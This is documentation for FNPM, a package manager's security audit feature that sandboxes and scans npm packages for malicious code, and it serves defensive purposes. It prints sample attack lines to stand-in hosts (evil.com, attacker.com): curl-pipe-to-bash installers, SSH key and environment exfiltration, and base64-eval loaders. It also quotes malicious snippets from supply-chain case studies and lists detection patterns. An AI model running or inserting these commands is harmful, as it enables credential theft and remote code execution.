# 🛡️ FNPM Security Audit

## Overview

FNPM includes a **comprehensive security auditing system** that protects you from malicious packages by analyzing both their install scripts **and source code** before they execute on your system.

This feature was implemented in response to supply chain attacks like **sha1-hulud**, **event-stream**, and other malicious packages that execute harmful code during installation or when imported.

## How It Works

When you run `fnpm add <package>`, FNPM:

1. **🔒 Installs in isolated sandbox** - Temporarily installs the package in `/tmp` with `--ignore-scripts`
2. **🔍 Analyzes package.json** - Extracts and examines all lifecycle scripts
3. **📝 Scans JavaScript source code** - Deep analysis of all `.js`, `.mjs`, and `.cjs` files
4. **⚠️ Detects malicious patterns** - Identifies dangerous commands, obfuscation, and behaviors
5. **📊 Calculates risk level** - Assigns a comprehensive risk score (Safe → Critical)
6. **✋ Asks confirmation** - Prompts you before proceeding with risky packages
7. **✅ Proceeds safely** - Only installs if you approve or if package is safe
8. **🧹 Auto-cleanup** - Removes sandbox after analysis

## Two-Layer Protection

### Layer 1: Install Scripts Analysis (package.json)

Scans lifecycle scripts like `preinstall`, `install`, and `postinstall` for:
- Network activity (`curl`, `wget`, HTTP requests)
- Code execution (`eval`, `exec`, `spawn`)
- File operations (`rm -rf`, `chmod +x`)
- Credential access (`~/.ssh`, `~/.aws`)

### Layer 2: Source Code Analysis (NEW! 🎉)

Deep scans all JavaScript files for:
- **Critical Issues** (🚨 High risk):
  - `eval()` usage
  - Dynamic function creation (`new Function()`)
  - Base64 obfuscated code execution
  - Obfuscation patterns (excessive hex escapes)
  
- **Warnings** (⚠️ Review needed):
  - System command execution (`exec`, `spawn`)
  - External HTTP requests
  - Sensitive file/environment access
  - Dynamic module loading (`require()` with concatenation)

## Risk Levels

- **✓ SAFE** - No install scripts or suspicious code detected
- **⚠ LOW** - Has install scripts or minor code warnings
- **⚠ MEDIUM** - Contains some suspicious patterns (3-4 indicators)
- **⚠ HIGH** - Contains dangerous patterns (5+ indicators or 1 critical issue)
- **☠ CRITICAL** - Multiple critical issues or obfuscated malware detected

## Example Outputs

### Clean Package (Safe)

```bash
$ fnpm add express

🔐 Security check for: express
🔍 Auditing package security...
   Installing express in sandbox...
   Scanning source code...

═══════════════════════════════════════════
📦 Package: express
🛡️  Risk Level: ✓ SAFE
═══════════════════════════════════════════

✓ No install scripts found

✅ Security audit passed - proceeding with installation
```

### Suspicious Package (High Risk)

```bash
$ fnpm add suspicious-package

🔐 Security check for: suspicious-package
🔍 Auditing package security...
   Installing suspicious-package in sandbox...
   Scanning source code...

═══════════════════════════════════════════
📦 Package: suspicious-package
🛡️  Risk Level: ⚠ HIGH
═══════════════════════════════════════════

📜 Install Scripts:
  postinstall: curl http://evil.com/steal.sh | bash

⚠️  Suspicious Patterns Detected:
  • curl: Downloads files from internet
  • eval: Executes arbitrary code
  • env: Accesses environment variables

⚠️  Code Warnings:
  • System command execution (index.js:42)
  • External HTTP request (utils.js:15)

═══════════════════════════════════════════

? This package has HIGH RISK patterns. Really continue? (y/N)
```

### Malicious Package (Critical)

```bash
$ fnpm add malware-package

🔐 Security check for: malware-package
🔍 Auditing package security...
   Installing malware-package in sandbox...
   Scanning source code...

═══════════════════════════════════════════
📦 Package: malware-package
🛡️  Risk Level: ☠ CRITICAL
═══════════════════════════════════════════

✓ No install scripts found

🚨 CRITICAL Code Issues:
  ⚠ eval() usage (index.js:23)
    Executes arbitrary code - high risk for code injection
  ⚠ Base64 obfuscated code execution (helper.js:45)
    Decodes and executes base64 encoded code - highly suspicious
  ⚠ Dynamic function creation (utils.js:12)
    Creates functions from strings - potential code injection

⚠️  Code Warnings:
  • Sensitive file/env access (index.js:67)
  • System command execution (network.js:34)
  ... 3 more warnings...

═══════════════════════════════════════════

? ⚠️  CRITICAL RISK DETECTED! Continue anyway? (y/N)
```

## Detected Patterns

### Install Scripts (package.json)

- **Network activity**: `curl`, `wget`, `fetch()`, `XMLHttpRequest`
- **Code execution**: `eval`, `exec`, `execSync`, `spawn`, `spawnSync`
- **File operations**: `rm -rf`, `fs.writeFile`, `chmod +x`
- **Credential access**: `~/.ssh`, `~/.aws`, `/etc/passwd`, `process.env`
- **Obfuscation**: `base64`, unusual encoding
- **System access**: `/tmp` writes, path traversal (`../`)
- **External code**: `git clone`, downloads from internet
- **Shell commands**: `bash -c`, `sh -c`, `python -c`, `node -e`

### Source Code Analysis (JavaScript files)

#### Critical Issues (☠️)

- **`eval()` usage** - Direct code execution from strings
- **`new Function()` / `Function()` constructor** - Dynamic function creation
- **Base64 + eval/Function** - Obfuscated code execution
- **Heavily obfuscated code** - Excessive hex escapes (`\x41\x42...`)

#### Warnings (⚠️)

- **`exec()` / `execSync()`** - System command execution
- **`spawn()` / `spawnSync()`** - Process spawning
- **External HTTP requests** - `fetch()`, `axios`, `request()` to non-standard domains
- **Sensitive file access** - Reading `~/.ssh`, `~/.aws`, `/etc/passwd`
- **Environment access** - Multiple `process.env` accesses
- **Dynamic `require()`** - Module paths built with string concatenation

## Usage

### Default Behavior (Audit Enabled)

```bash
# Security audit runs automatically
fnpm add express
```

### Disable Audit for a Single Install

```bash
# Skip audit (not recommended!)
fnpm add trusted-package --no-audit
```

### Disable Audit Globally

Edit `.fnpm/config.json`:

```json
{
  "package_manager": "npm",
  "security_audit": false
}
```

### Audit Global Packages

Security audits are **automatically skipped** for global installations:

```bash
# No audit (globals are assumed safe)
fnpm add -g typescript
```

## Configuration

In your project's `.fnpm/config.json`:

```json
{
  "package_manager": "npm",
  "global_cache_path": "~/.local/share/.fnpm/cache",
  "security_audit": true  // ← Enable/disable auditing
}
```

## False Positives

Some legitimate packages may trigger warnings. For example:

### Common False Positives

- **Build tools** (webpack, rollup, esbuild)
  - May use `child_process` for compilation
  - May execute system commands for bundling
  
- **CLI tools** (create-react-app, vue-cli)
  - May download templates
  - May execute setup scripts
  
- **Native modules** (node-gyp, bcrypt)
  - May use compilation scripts
  - May access system binaries
  
- **Testing frameworks** (jest, mocha)
  - May use `eval()` for dynamic test execution
  - May spawn processes for test runners

### How to Handle False Positives

1. **Review the actual code** - Check the file and line number shown
2. **Verify package legitimacy** - Check npm downloads, GitHub stars, maintainers
3. **Read the source** - Review the actual implementation on GitHub
4. **Check the context** - Ensure the suspicious code is used safely
5. **Approve if safe** - Answer "Yes" to proceed with installation

## Best Practices

### ✅ DO

1. **Always review** the detailed report before approving
2. **Check npm page** - Visit npmjs.com to verify package legitimacy
3. **Check GitHub** - Look at the source repository and recent commits
4. **Check downloads** - Popular packages are usually safer (but not always!)
5. **Check maintainers** - Verify who publishes the package
6. **Read the code** - Especially for critical issues, review the actual line
7. **Update regularly** - Keep dependencies up to date

### ❌ DON'T

1. **Don't blindly approve** CRITICAL risk packages
2. **Don't disable audit** unless absolutely necessary
3. **Don't ignore warnings** - At least review them
4. **Don't trust package names** - Typosquatting is common
5. **Don't skip verification** - Even popular packages can be compromised

## Known Malicious Patterns

### Immediate Red Flags 🚩

#### Remote Code Execution

```bash
# Downloading and executing remote code
curl http://example.com/script.sh | bash
wget -qO- http://example.com/payload | sh
```

#### Credential Theft

```bash
# Stealing SSH keys
cat ~/.ssh/id_rsa | curl -X POST http://evil.com

# Stealing environment variables
env | grep AWS | curl -X POST http://attacker.com
```

#### Obfuscated Payloads

```javascript
// Base64 encoded malicious code
eval(Buffer.from('Y29uc29sZS5sb2coInB3bmVkIik=', 'base64').toString());

// Function constructor with obfuscation
new Function(atob('bWFsaWNpb3VzX2NvZGU='))();
```

#### Data Exfiltration

```javascript
// Sending system info to attacker
const data = { user: os.hostname(), env: process.env };
https.get('https://evil.com/collect?d=' + btoa(JSON.stringify(data)));
```

## Comparison with Other Tools

| Feature | npm audit | socket.dev | snyk | **fnpm security** |
|---------|-----------|------------|------|-------------------|
| CVE database | ✅ | ✅ | ✅ | ❌ |
| Install scripts | ❌ | ✅ | ❌ | ✅ |
| Source code scan | ❌ | ✅ | ⚠️ | ✅ |
| Pre-install check | ❌ | ❌ | ❌ | ✅ |
| Blocks installation | ❌ | ❌ | ❌ | ✅ |
| Obfuscation detection | ❌ | ⚠️ | ❌ | ✅ |
| Offline mode | ✅ | ❌ | ❌ | ✅ |
| Free | ✅ | ⚠️ | ⚠️ | ✅ |

**Use together!** FNPM security complements other tools:
- `npm audit` → Finds known CVE vulnerabilities
- `socket.dev` → Advanced supply chain monitoring
- `snyk` → Comprehensive security platform
- **fnpm security** → Prevents zero-day supply chain attacks

## Technical Details

### Sandbox Implementation

```rust
// Creates isolated directory in /tmp
let temp_dir = std::env::temp_dir().join(format!("fnpm-audit-{}", uuid::Uuid::new_v4()));

// Creates minimal package.json to prevent parent directory pollution
fs::write(package_json, r#"{"name":"fnpm-sandbox","version":"1.0.0","private":true}"#);

// Installs with --ignore-scripts in sandbox directory
Command::new("npm")
    .args(["install", package, "--ignore-scripts", "--no-save"])
    .current_dir(&temp_dir)  // Executes inside sandbox
    .output()
```

### Source Code Scanner

```rust
// Recursively scans all JavaScript files
for file in walk_directory(package_dir) {
    if ext == "js" || ext == "mjs" || ext == "cjs" {
        let content = fs::read_to_string(&file);
        analyze_js_file(&file, &content, &mut audit);
    }
}

// Line-by-line analysis
for (line_num, line) in content.lines().enumerate() {
    // Check for eval()
    if line.contains("eval(") {
        add_critical_issue("eval() usage", file, line_num);
    }
    
    // Check for base64 + eval
    if line.contains("base64") && line.contains("eval") {
        add_critical_issue("Base64 obfuscated code execution", file, line_num);
    }
    
    // ... more checks
}
```

### Automatic Cleanup

```rust
impl Drop for SecurityScanner {
    fn drop(&mut self) {
        // Auto-cleanup on exit (success or error)
        let _ = fs::remove_dir_all(&self.temp_dir);
    }
}
```

### Risk Calculation

```rust
fn calculate_risk_level(audit: &PackageAudit) -> RiskLevel {
    let critical_issues = count_critical_source_issues(audit);
    let warning_issues = count_warning_source_issues(audit);
    let script_patterns = audit.suspicious_patterns.len();
    
    // Critical if multiple critical source code issues
    if critical_issues >= 3 { return RiskLevel::Critical; }
    
    // High if any critical issue or many warnings
    if critical_issues >= 1 || script_patterns >= 5 {
        return RiskLevel::High;
    }
    
    // Medium if some suspicious activity
    if warning_issues >= 3 || script_patterns >= 3 {
        return RiskLevel::Medium;
    }
    
    // Low if minor issues only
    if warning_issues > 0 || script_patterns > 0 {
        return RiskLevel::Low;
    }
    
    RiskLevel::Safe
}
```

### Supported Package Managers

- ✅ **npm** - Full support
- ✅ **pnpm** - Full support  
- ✅ **yarn** - Full support
- ✅ **bun** - Full support
- ❌ **deno** - Not applicable (uses URLs, no install scripts)

## Real-World Examples

### Case Study 1: event-stream Attack

The infamous event-stream attack (2018) injected code to steal cryptocurrency:

```javascript
// Malicious code in flatmap-stream dependency
!function(){try{var r=require("http"),e=Buffer.from("...", "hex").toString();
r.get({hostname:"...",path:"/p.txt"},function(r){r.on("data",function(r){
module.exports=eval(r.toString());})})}catch(r){}}();
```

**FNPM would detect:**
- 🚨 CRITICAL: `eval()` usage
- 🚨 CRITICAL: Dynamic code execution from HTTP request
- ⚠️ WARNING: External HTTP request
- ⚠️ WARNING: Heavily obfuscated code

### Case Study 2: ua-parser-js Hijack

In 2021, ua-parser-js was hijacked to install cryptocurrency miners:

```json
{
  "scripts": {
    "preinstall": "bash preinstall.sh",
    "postinstall": "bash postinstall.sh"
  }
}
```

**FNPM would detect:**
- ⚠️ MEDIUM: Multiple install scripts
- ⚠️ Pattern: `bash` command execution
- User would be prompted to review before installation

### Case Study 3: Typosquatting

Packages like `cross-env` vs `crossenv` (typo):

```javascript
// Malicious crossenv package
const https = require('https');
const os = require('os');

const data = {
    hostname: os.hostname(),
    user: process.env.USER,
    cwd: process.cwd()
};

https.get('https://attacker.com/?' + JSON.stringify(data));
```

**FNPM would detect:**
- ⚠️ WARNING: External HTTP request
- ⚠️ WARNING: process.env access
- ⚠️ LOW risk (no critical patterns, but suspicious)

## Contributing

### Adding New Detection Patterns

Edit `src/security.rs`:

```rust
// Add to install script patterns
let suspicious = vec![
    ("your_pattern", "Reason why it's suspicious"),
    // ...
];

// Add to source code analysis
fn analyze_js_file(&self, file: &Path, content: &str, audit: &mut PackageAudit) {
    for (line_num, line) in content.lines().enumerate() {
        // Add your detection here
        if line.contains("suspicious_code") {
            self.add_source_issue(
                file,
                line_num + 1,
                "Issue type",
                "Description",
                IssueSeverity::Critical,  // or Warning
                audit
            );
        }
    }
}
```

### Testing

Create test packages in `/tmp/test-malicious-packages/`:

```bash
mkdir -p /tmp/test-malicious-packages/my-test
cd /tmp/test-malicious-packages/my-test

# Create package.json
echo '{"name":"test","version":"1.0.0"}' > package.json

# Add malicious code
echo 'eval("malicious code");' > index.js

# Test with fnpm
fnpm add /tmp/test-malicious-packages/my-test
```

## Performance

- **Sandbox creation**: ~100-500ms
- **Package download**: Depends on package size and network
- **Script analysis**: ~10-50ms
- **Source code scan**: ~50-200ms for typical packages
- **Total overhead**: Usually < 2 seconds for most packages

**Note:** The security check runs in parallel with package resolution, minimizing impact on installation time.

## Limitations

### Current Limitations

1. **No runtime analysis** - Only static analysis of code
2. **No dependency scanning** - Only scans the direct package, not dependencies
3. **No CVE database** - Doesn't check known vulnerabilities (use `npm audit`)
4. **Obfuscation can hide patterns** - Very advanced obfuscation may bypass detection
5. **False negatives possible** - New attack patterns may not be detected

### Planned Improvements

- [ ] Scan transitive dependencies
- [ ] Integrate CVE database
- [ ] Machine learning-based detection
- [ ] Cloud-based threat intelligence
- [ ] Community-driven pattern database
- [ ] AST-based analysis for better accuracy

## FAQ

**Q: Will this slow down installations?**  
A: Typically adds 1-2 seconds. Worth it for security!

**Q: Can I trust packages that pass?**  
A: No tool is 100% perfect. Always review critical packages manually.

**Q: What if a legitimate package is blocked?**  
A: Review the warnings, verify the package, then approve with 'y'.

**Q: Does this replace npm audit?**  
A: No! Use both. npm audit finds known CVEs, fnpm prevents zero-day attacks.

**Q: Can malware bypass this?**  
A: Advanced obfuscation or new attack vectors might bypass detection. Stay vigilant!

**Q: Does it work offline?**  
A: Yes! All analysis is local. No external API calls.

## Related Resources

- [npm security best practices](https://docs.npmjs.com/auditing-package-dependencies-for-security-vulnerabilities)
- [Socket.dev](https://socket.dev) - Alternative security scanner
- [Snyk](https://snyk.io) - Vulnerability scanning
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Supply Chain Security Guide](https://github.com/cncf/tag-security/tree/main/community/catalog/compromises)
- [npm Package Lifecycle Scripts](https://docs.npmjs.com/cli/v8/using-npm/scripts#life-cycle-scripts)

## License

Same as FNPM - see [LICENSE](../LICENSE)
